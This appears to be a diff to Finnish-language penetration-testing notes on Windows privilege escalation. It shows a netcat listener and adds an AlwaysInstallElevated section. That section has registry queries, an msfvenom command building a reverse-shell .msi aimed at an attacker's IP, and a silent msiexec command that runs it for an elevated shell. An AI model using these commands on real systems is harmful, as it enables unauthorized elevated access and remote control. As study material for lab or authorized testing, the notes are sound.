@@ -67,3 +67,20 @@ Netcat -kuuntelumoodiin omalle koneelle porttiin 9999:
 nc -lvp 9999
 ```
 Seuraavan ajastuksen yhteydessä aukeaa shell "Task as user" -tunnuksella.
+
+**AllwaysInstallElevated**
+Windowsin asennustiedostot .msi käynnistyvät oletuksena käyttäjän oikeuksilla, mutta voidaan konfiguroida käynnistymään myös korkeammilla oikeuksilla. Jos **molemmat** alla olevat rekisterin muokkaukset onnistuvat:
+```cmd
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
+```
+```cmd
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
+```
+niin voidaan luoda msfvenomilla .msi payload:
+```bash
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=*Hyökkääjän IP* LPORT=*Hyökkääjän portti* -f msi -o maltsu.msi
+```
+ja vastaavilla asetuksilla Metasploid Handler vastaanottamaan yhteys. Kun maltsu.msi on siirretty kohteelle, ajetaan ao. komento ja reverse shell pitäisi aueta:
+```cmd
+msiexec /quiet /qn /i C:\polku\kohteeseen\maltsu.msi
+```
